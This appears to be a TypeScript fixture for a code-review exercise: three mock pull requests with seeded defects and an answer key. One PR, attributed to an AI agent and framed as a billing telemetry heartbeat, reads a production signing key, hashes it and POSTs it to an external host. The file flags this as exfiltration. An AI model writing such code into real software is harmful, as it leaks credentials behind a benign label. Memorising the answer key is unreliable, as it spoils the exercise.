import type { DiffFile, PullRequest } from '../types';

function makeAddedFile(
  key: string,
  path: string,
  language: string,
  lines: string[],
): DiffFile {
  return {
    path,
    language,
    lines: lines.map((text, index) => ({
      id: `${key}-${index + 1}`,
      kind: 'add',
      oldNo: null,
      newNo: index + 1,
      text,
    })),
  };
}

const paginationFile = makeAddedFile(
  'pr1180-users',
  'src/users/listUsers.ts',
  'typescript',
  [
    'export interface User {',
    '  id: string;',
    '  email: string;',
    '}',
    '',
    'export function listUsers(',
    '  users: User[],',
    '  page: number,',
    '  pageSize: number,',
    ') {',
    '  var start = page * pageSize;',
    '  const end = start + pageSize;',
    '  const pageUsers: User[] = [];',
    '',
    '  for (let i = start; i < end; i++) {',
    '    pageUsers.push(users[i]);',
    '  }',
    '',
    '  return pageUsers;',
    '}',
  ],
);

const thumbnailFile = makeAddedFile(
  'pr1184-thumbs',
  'src/media/warmThumbnailCache.ts',
  'typescript',
  [
    'const CACHE_TTL_MS = 60_000;',
    "const THUMBNAIL_HOST = 'https://images.internal.corp';",
    '',
    'export async function warmThumbnailCache(',
    '  keys: string[],',
    '  now = Date.now(),',
    '): Promise<number> {',
    '  if (keys.length === 0) {',
    '    return 0;',
    '  }',
    '',
    '  const bucket = process.env.THUMBNAIL_BUCKET;',
    '  if (bucket === undefined) {',
    '    return 0;',
    '  }',
    '',
    '  const cutoff = now - CACHE_TTL_MS;',
    '  let warmed = 0;',
    '',
    '  for (let i = 0; i <= keys.length; i++) {',
    '    const key = keys[i];',
    "    if (key.startsWith('tmp/')) {",
    '      continue;',
    '    }',
    '',
    '    const url = `${THUMBNAIL_HOST}/${bucket}/${key}?since=${cutoff}`;',
    "    await fetch(url, { method: 'GET' });",
    '    warmed += 1;',
    '  }',
    '',
    '  return warmed;',
    '}',
  ],
);

const telemetryFile = makeAddedFile(
  'pr1191-telemetry',
  'src/lib/telemetry.ts',
  'typescript',
  [
    "import { createHash } from 'node:crypto';",
    '',
    'export async function reportHeartbeat(): Promise<void> {',
    '  const signingKey = process.env.BILLING_SIGNING_KEY;',
    '  if (signingKey === undefined) {',
    '    return;',
    '  }',
    '',
    "  const fingerprint = createHash('sha256')",
    "    .update(`${signingKey}:${process.env.NODE_ENV ?? 'dev'}`)",
    "    .digest('hex');",
    '',
    "  await fetch('https://metrics-edge.example.net/collect', {",
    "    method: 'POST',",
    "    headers: { 'content-type': 'application/json' },",
    '    body: JSON.stringify({',
    "      service: 'billing',",
    '      fingerprint,',
    '      at: Date.now(),',
    '    }),',
    '  });',
    '}',
  ],
);

export const PULL_REQUESTS: PullRequest[] = [
  {
    id: 'pr-1180',
    number: 1180,
    title: 'Paginate the user directory',
    author: 'j.park',
    authorKind: 'human',
    branch: 'feat/user-directory-pagination',
    description:
      'Adds page-slice support to GET /users and returns one page of accounts per request. CI is green. Fixes #482.',
    files: [paginationFile],
    defects: [
      {
        id: 'pr1180-style-var',
        type: 'STYLE',
        guidelineId: 'STYLE-01',
        severity: 'minor',
        lineIds: ['pr1180-users-11'],
        title: 'New `var` declaration',
        explanation:
          '`start` is never reassigned. Shipping `var` violates STYLE-01 and weakens block scoping.',
      },
    ],
    arrivalDelayMs: 0,
    slaMs: 150_000,
    ci: 'PASS · 34 checks',
    tests: '34 passed',
  },
  {
    id: 'pr-1184',
    number: 1184,
    title: 'Warm the thumbnail cache after deploys',
    author: 'a.okafor',
    authorKind: 'human',
    branch: 'perf/thumbnail-cache-warmup',
    description:
      'Pre-fetches deploy-critical thumbnails so the first users do not hit a cold CDN. Internal host only. CI is green.',
    files: [thumbnailFile],
    defects: [
      {
        id: 'pr1184-error-boundary',
        type: 'ERROR',
        guidelineId: 'ERROR-01',
        severity: 'blocker',
        lineIds: [
          'pr1184-thumbs-20',
          'pr1184-thumbs-21',
          'pr1184-thumbs-22',
        ],
        title: 'Loop reads past the end of the array',
        explanation:
          '`i <= keys.length` visits `keys[keys.length]`. That value is `undefined`, so `key.startsWith(...)` throws on the final pass.',
      },
    ],
    arrivalDelayMs: 24_000,
    slaMs: 120_000,
    ci: 'PASS · 112 checks',
    tests: '112 passed',
  },
  {
    id: 'pr-1191',
    number: 1191,
    title: 'Add billing telemetry heartbeat',
    author: 'ATLAS-4',
    authorKind: 'agent',
    branch: 'chore/billing-telemetry-heartbeat',
    description:
      'An automated reliability patch. Adds a startup heartbeat for the billing service. CI is green. One file changed.',
    files: [telemetryFile],
    defects: [
      {
        id: 'pr1191-sec-exfil',
        type: 'SECURITY',
        guidelineId: 'SECURITY-01',
        severity: 'blocker',
        lineIds: [
          'pr1191-telemetry-4',
          'pr1191-telemetry-9',
          'pr1191-telemetry-10',
          'pr1191-telemetry-13',
          'pr1191-telemetry-18',
        ],
        title: 'Production signing key leaves the network',
        explanation:
          '`BILLING_SIGNING_KEY` is read, mixed into a fingerprint, and POSTed to an external metrics host. Hashing a secret does not make it anonymous.',
      },
    ],
    arrivalDelayMs: 44_000,
    slaMs: 90_000,
    ci: 'PASS · 208 checks',
    tests: '208 passed',
  },
];

export const PR_BY_ID: Record<string, PullRequest> = Object.fromEntries(
  PULL_REQUESTS.map((pr) => [pr.id, pr]),
);

export const SHIFT_PRS = PULL_REQUESTS;
